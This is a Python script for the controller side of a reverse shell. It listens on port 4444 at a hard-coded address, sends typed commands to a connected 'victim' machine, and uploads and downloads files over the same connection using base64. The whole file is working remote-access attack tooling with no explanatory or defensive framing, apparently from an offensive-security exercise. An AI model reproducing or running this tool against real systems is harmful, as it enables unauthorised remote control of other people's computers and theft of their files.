#!/usr/bin/env python
import socket
import json
import base64

class Listener:
    def __init__(self, ip, p):
        l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        l.bind((ip, p))
        l.listen(0)
        print("[.] Waiting for incoming Connections...")
        self.conn, self.ip_addr = l.accept()
        print("[+] Got a connection from " + str(self.ip_addr[0]) + " from port " + str(self.ip_addr[1]))

    def send_data(self, data):
        pack_data = json.dumps(data)
        self.conn.send(pack_data)

    def recv_data(self):
        pack_data = b''
        while True:
            try:
                pack_data += self.conn.recv(1024)
                here_out = json.loads(pack_data)
                return here_out
            except ValueError:
                continue

    def execute_at_victim(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.conn.close()
            exit()
        return self.recv_data()

    def read_file(self, name):
        with open(name, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, name, content):
         with open(name, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download Successful!"

    def start(self):
        while True:
            try:
                command = raw_input(">>")
            except:
                command = input(">>")
            command = command.split(" ")
            if command[0] == "upload":
                content = self.read_file(command[1])
                command.append(content)
            output = self.execute_at_victim(command)
            if command[0] == "download":
                output = self.write_file(command[1], output)
            print(output)


listen = Listener("192.168.1.17", 4444)
listen.start()
